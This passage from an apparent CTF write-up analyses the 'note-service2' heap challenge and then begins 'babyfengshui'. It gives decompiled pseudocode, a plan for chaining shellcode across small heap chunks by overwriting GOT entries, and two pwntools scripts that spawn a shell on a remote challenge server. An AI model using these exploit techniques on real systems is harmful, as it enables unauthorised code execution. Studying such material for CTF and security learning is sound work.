<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">initial</span>();</span><br><span class="line">  <span class="built_in">banner</span>();</span><br><span class="line">  <span class="built_in">entry</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>entry</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">entry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your choice&gt;&gt; &quot;</span>);</span><br><span class="line">    <span class="built_in">read_num</span>();</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        <span class="built_in">add</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="built_in">show</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        <span class="built_in">edit</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="built_in">del</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>read_num</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_num</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">read_num_sub</span>((__int64)&amp;nptr, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">atoi</span>(&amp;nptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>add</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = dword_20209C;</span><br><span class="line">  <span class="keyword">if</span> ( dword_20209C &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = dword_20209C;</span><br><span class="line">    <span class="keyword">if</span> ( dword_20209C &lt;= <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">      v1 = <span class="built_in">read_num</span>();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">      result = <span class="built_in">read_num</span>();</span><br><span class="line">      v2 = result;</span><br><span class="line">      <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qword_2020A0[v1] = <span class="built_in">malloc</span>(result);</span><br><span class="line">        <span class="keyword">if</span> ( !qword_2020A0[v1] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;malloc error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">        <span class="built_in">read_num_sub</span>(qword_2020A0[v1], v2);</span><br><span class="line">        result = dword_20209C++ + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>del</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST0C_4</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  v0 = <span class="built_in">read_num</span>();</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_2020A0[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>I rename some items in IDA results to simplify understanding process. <code>show</code> and <code>edit</code> are not implemented.</p>
<h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>As it only has <code>add</code> and <code>del</code> operations, it is unlikely to have <code>UAF</code>. The vulnerability exists in <code>add</code> because index <code>v1</code> is not restricted, so we can write anywhere anything.<br>Given that <code>NX</code> is disabled we can write shellcodes and execute on the heap.</p>
<p>Our target shellcode should be like:</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>,xxxx    # /bin/sh</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">0x3b</span>    # execve (check <span class="string">`/usr/include/asm/unistd_64.h`</span>)</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rsi</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdx</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
<p>A problem is: every <code>note</code> size is in [0,8], but shellcode is definitely longer than this, so we have to think about dividing them into small pieces and connecting them as a chain.</p>
<p>The basic structure of <code>chunks</code> in heap is:</p>
<table><thead><tr><th>Chunk </th><th>Content</th><th>Length</th></tr></thead><tbody><tr><td rowspan="6">Chunk 0</td><td>prev_size</td><td>0x8 bytes</td></tr><tr><td>size</td><td>0x8 bytes</td></tr><tr><td rowspan="3">Content 0<br>old fd</td><td rowspan="3">0x8 bytes</td></tr><tr></tr><tr></tr><tr><td>old bk</td><td>0x8 bytes</td></tr><tr><td rowspan="6">Chunk 1</td><td>prev_size</td><td>0x8 bytes</td></tr><tr><td>size</td><td>0x8 bytes</td></tr><tr><td rowspan="3">Content 1<br>old fd</td><td rowspan="3">0x8 bytes</td></tr><tr></tr><tr></tr><tr><td>old bk</td><td>0x8 bytes</td></tr><tr><td>Chunk 2</td><td>...</td><td>...</td></tr></tbody></table>

<p>However after we write 8 bytes as content to old <code>fd</code>, there is still 8-byte old <code>bk</code> behind, let alone the <code>prev_size</code> and <code>size</code>.<br>We have to use <code>jmp</code> (2 bytes long) for linking shellcode pieces from the former chunk to the next (they are adjacent if allocated in order), and remember the 8th byte is set <code>0</code> by program, so it is about 1+8+8+8&#x3D;25 bytes away:</p>
<table><thead><tr><th>Chunk </th><th>Content</th><th>Length</th></tr></thead><tbody><tr><td rowspan="6">Chunk 0</td><td>prev_size</td><td>0x8 bytes</td></tr><tr><td>size</td><td>0x8 bytes</td></tr><tr><td>0x5 bytes codes</td><td rowspan="3">0x8 bytes</td></tr><tr><td>0x2 bytes jmp</td></tr><tr><td>0x1 bytes "0"</td></tr><tr><td>old bk</td><td>0x8 bytes</td></tr><tr><td rowspan="6">Chunk 1</td><td>prev_size</td><td>0x8 bytes</td></tr><tr><td>size</td><td>0x8 bytes</td></tr><tr><td>0x5 bytes codes</td><td rowspan="3">0x8 bytes</td></tr><tr><td>0x2 bytes jmp</td></tr><tr><td>0x1 bytes "0"</td></tr><tr><td>old bk</td><td>0x8 bytes</td></tr><tr><td>Chunk 2</td><td>...</td><td>...</td></tr></tbody></table>

<p>We use <code>jmp short xxx</code> to jump to a target address and the relation between them is: <code>xxx = target_addr - current_addr - 2</code> (calculated from existing cases), so here <code>xxx</code> should be <code>2+1+8+8+8-0-2=25=0x19</code> (<code>jmp short 0x19</code>).</p>
<p>But <code>add</code> and <code>del</code> can execute codes on the heap neither, so we may need to hijack <code>GOT</code> item. Here I choose to hijack <code>free</code> in <code>GOT</code> because we can trigger it by choosing <code>4. del note</code>.</p>
<p><code>GOT</code> content:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.got.plt:0000000000202000                 dq offset stru_201DF8</span><br><span class="line">.got.plt:0000000000202008 qword_202008    dq 0                    ; DATA XREF: sub_880↑r</span><br><span class="line">.got.plt:0000000000202010 qword_202010    dq 0                    ; DATA XREF: sub_880+6↑r</span><br><span class="line">.got.plt:0000000000202018 off_202018      dq offset free          ; DATA XREF: _free↑r</span><br><span class="line">.got.plt:0000000000202020 off_202020      dq offset puts          ; DATA XREF: _puts↑r</span><br><span class="line">.got.plt:0000000000202028 off_202028      dq offset __stack_chk_fail</span><br><span class="line">.got.plt:0000000000202028                                         ; DATA XREF: ___stack_chk_fail↑r</span><br><span class="line">.got.plt:0000000000202030 off_202030      dq offset printf        ; DATA XREF: _printf↑r</span><br><span class="line">.got.plt:0000000000202038 off_202038      dq offset memset        ; DATA XREF: _memset↑r</span><br><span class="line">.got.plt:0000000000202040 off_202040      dq offset read          ; DATA XREF: _read↑r</span><br><span class="line">.got.plt:0000000000202048 off_202048      dq offset __libc_start_main</span><br><span class="line">.got.plt:0000000000202048                                         ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0000000000202050 off_202050      dq offset malloc        ; DATA XREF: _malloc↑r</span><br><span class="line">.got.plt:0000000000202058 off_202058      dq offset setvbuf       ; DATA XREF: _setvbuf↑r</span><br><span class="line">.got.plt:0000000000202060 off_202060      dq offset atoi          ; DATA XREF: _atoi↑r</span><br><span class="line">.got.plt:0000000000202068 off_202068      dq offset exit          ; DATA XREF: _exit↑r</span><br></pre></td></tr></table></figure>
<p>The content stores in:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:00000000002020A0 qword_2020A0    dq 0Ch dup(?)           ; DATA XREF: initial+18↑o</span><br></pre></td></tr></table></figure>
<p>So it is not hard to control index to access <code>GOT</code> items, for example, set index as <code>-(2020A0-202018)/8=-17</code> to access <code>free</code> in <code>GOT</code>. The whole process is like:<br><img src="/imghost/apcaw/hg1.svg" alt="Whole Process"><br>The last thing is to build <code>mov rdi,xxxx    # /bin/sh</code>, we need to input it first, then move it to <code>rdi</code>. Considering we have to use <code>free</code> to trigger shellcodes, if we save <code>/bin/sh</code> in a chunk, before executing <code>free</code> the rdi will saves chunk address, which is also the address of <code>/bin/sh</code>.</p>
<p>See exploits to check more details.</p>
<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>Hijack <code>free</code> in <code>GOT</code>:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&quot;./note-service2&quot;</span>)</span><br><span class="line">sh=remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">59324</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./note-service2&quot;</span>)</span><br><span class="line">free_got=<span class="number">0x0202018</span></span><br><span class="line">content_addr=<span class="number">0x2020A0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">i,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;your choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">i</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;your choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    sh.send(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">add((free_got-content_addr)/<span class="number">8</span>,asm(<span class="string">&quot;xor rax,rax&quot;</span>)+<span class="string">&quot;\x90\x90\xEB\x19&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>,asm(<span class="string">&quot;mov eax,0x3b&quot;</span>)+<span class="string">&quot;\xeb\x19&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,asm(<span class="string">&quot;xor rdx,rdx&quot;</span>)+<span class="string">&#x27;\x90\x90\xEB\x19&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,asm(<span class="string">&quot;xor rsi,rsi&quot;</span>)+<span class="string">&#x27;\x90\x90\xEB\x19&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,asm(<span class="string">&quot;syscall&quot;</span>).ljust(<span class="number">7</span>,<span class="string">&#x27;\x90&#x27;</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>You may find that we use <code>mov eax,0x3b</code> instead of <code>mov rax,0x3b</code>, that is because <code>mov eax,0x3b</code> is 5 bytes long while <code>mov rax,0x3b</code> is 6 bytes long. But we must add a 2 bytes <code>\xEB\x19</code> (<code>jmp short 0x19</code>), so 7 bytes only leave us 5 bytes to write. Therefore <code>xor rax,rax</code> is needed.</p>
<p>Or we can hijack <code>atoi</code> in <code>GOT</code>, which is a clever way:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./note-service2&#x27;</span>)  </span><br><span class="line">sh=remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">59324</span>)</span><br><span class="line">  </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">index,size,content</span>):</span>  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;content:&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span>  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#rax = 0 jmp short next_chunk  </span></span><br><span class="line">code0 = (asm(<span class="string">&#x27;xor rax,rax&#x27;</span>) + <span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)  </span><br><span class="line"><span class="comment">#rax = 0x3B jmp short next_chunk  </span></span><br><span class="line">code1= (asm(<span class="string">&#x27;mov eax,0x3B&#x27;</span>) + <span class="string">&#x27;\xeb\x19&#x27;</span>)  </span><br><span class="line"><span class="comment">#rsi = 0 jmp short next_chunk  </span></span><br><span class="line">code2 = (asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>) + <span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)  </span><br><span class="line"><span class="comment">#rdi = 0 jmp short next_chunk  </span></span><br><span class="line">code3 = (asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>) + <span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)  </span><br><span class="line"><span class="comment">#system call  </span></span><br><span class="line">code4 = (asm(<span class="string">&#x27;syscall&#x27;</span>).ljust(<span class="number">7</span>,<span class="string">&#x27;\x90&#x27;</span>))    </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;print len(code0) </span></span><br><span class="line"><span class="string">print len(code1) </span></span><br><span class="line"><span class="string">print len(code2) </span></span><br><span class="line"><span class="string">print len(code3) </span></span><br><span class="line"><span class="string">print len(code4) </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>    </span><br><span class="line">create(<span class="number">0</span>,<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">7</span>)  </span><br><span class="line">create(<span class="number">1</span>,<span class="number">8</span>,code1)  </span><br><span class="line">create(<span class="number">2</span>,<span class="number">8</span>,code2)  </span><br><span class="line">create(<span class="number">3</span>,<span class="number">8</span>,code3)  </span><br><span class="line">create(<span class="number">4</span>,<span class="number">8</span>,code4)  </span><br><span class="line"><span class="comment"># delete first chunk </span></span><br><span class="line">delete(<span class="number">0</span>)  </span><br><span class="line"><span class="comment"># allocate first chunk and assign it to `atoi` item in `GOT`  </span></span><br><span class="line">create(-<span class="number">8</span>,<span class="number">8</span>,code0)  </span><br><span class="line"><span class="comment"># getshell  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>

<h2 id="babyfengshui"><a href="#babyfengshui" class="headerlink" title="babyfengshui"></a>babyfengshui</h2><p>Attachment: <a href="/filehost/apcaw/babyfengshui.gz">babyfengshui.gz</a><br>Description: This shell is super useful! See if you can get the flag! The binary can be found on the server at <code>/home/ctf/</code>.</p>
<p>This challenge uses the rule of <code>glibc</code> memory releasing and allocation.</p>
<h3 id="Information-2"><a href="#Information-2" class="headerlink" title="Information"></a>Information</h3><p>Unzip first:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tar xzvf  babyfengshui.gz</span><br><span class="line">./babyfengshui</span><br><span class="line">./libc.so.6</span><br></pre></td></tr></table></figure>
<p>Then check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file babyfengshui</span><br><span class="line">babyfengshui: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cecdaee24200fe5bbd3d34b30404961ca49067c6, stripped</span><br><span class="line">$ checksec babyfengshui</span><br><span class="line">[*] &#x27;/root/babyfengshui&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">$ ./libc.so.6</span><br><span class="line">GNU C Library (Debian GLIBC 2.19-18+deb8u3) stable release version 2.19, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2014 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 4.8.4.</span><br><span class="line">Compiled on a Linux 3.16.7 system on 2016-02-12.</span><br><span class="line">Available extensions:</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.debian.org/Bugs/&gt;.</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl __noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// [esp+3h] [ebp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;0: Add a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: Delete a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: Display a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: Update a user description&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Action: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1) == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size of description: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;v2, &amp;v0);</span><br><span class="line">      <span class="built_in">add</span>(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      <span class="built_in"><span class="keyword">delete</span></span>(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      <span class="built_in">display</span>(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      <span class="built_in">update</span>(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( user_index &gt; <span class="number">0x31</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;maximum capacity exceeded, bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>add</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">add</span><span class="params">(<span class="keyword">size_t</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// ST24_4</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// ST28_4</span></span><br><span class="line"></span><br><span class="line">  s = <span class="built_in">malloc</span>(a1);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, a1);</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v2, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  *v2 = s;</span><br><span class="line">  ptr[user_index] = v2;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name: &quot;</span>);</span><br><span class="line">  <span class="built_in">read_name</span>(ptr[user_index] + <span class="number">4</span>, <span class="number">124</span>);</span><br><span class="line">  <span class="built_in">update</span>(++user_index - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>read_name</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">read_name</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">fgets</span>(a1, a2, stdin);</span><br><span class="line">  v3 = <span class="built_in">strchr</span>(a1, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>update</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">update</span><span class="params">(<span class="keyword">unsigned</span> __int8 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+17h] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; user_index &amp;&amp; ptr[a1] )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text length: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, 